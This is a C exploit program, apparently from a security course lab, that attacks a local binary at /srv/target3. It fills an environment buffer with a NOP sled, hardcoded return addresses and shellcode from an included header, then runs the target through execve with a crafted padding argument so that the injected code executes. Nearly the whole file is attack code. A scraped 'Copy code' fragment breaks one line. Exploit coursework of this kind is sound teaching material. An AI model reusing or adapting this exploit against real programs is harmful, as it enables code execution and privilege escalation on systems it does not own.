#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#define TARGET "/srv/target3"
const int ENV_SIZE = 400;
const uint32_t BASE_ADDRESS = 0xffffdec0;
const int NOP_SLED_SIZE = 201;
const char NOP = 0x90;
const int RET_ADDR_OFFSET = 4;
const uint32_t StartAddress = BASE_ADDRESS + RET_ADDR_OFFSET;
const uint32_t SecondAddress = BASE_ADDRESS + 2 * RET_ADDR_OFFSET;
const char Padding[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";
void prepareEnvironment(char *environment) {
memset(environment, NOP, ENV_SIZE - 1);
*((uint32_t *)(environment)) = StartAddress;
*((uint32_t *)(environment + RET_ADDR_OFFSET)) = SecondAddress;
memcpy(environment + NOP_SLED_SIZE, shellcode, sizeof(shellcode));
environment[ENV_SIZE - 1] = '\0';
}
int main(void) {
char *arguments[] = {TARGET, (char *)Padding, NULL};
char environment[ENV_SIZE];
Copy codeprepareEnvironment(environment);

char *env[] = {environment, NULL};

execve(TARGET, arguments, env);
fprintf(stderr, "execve failed.\n");

return 0;
}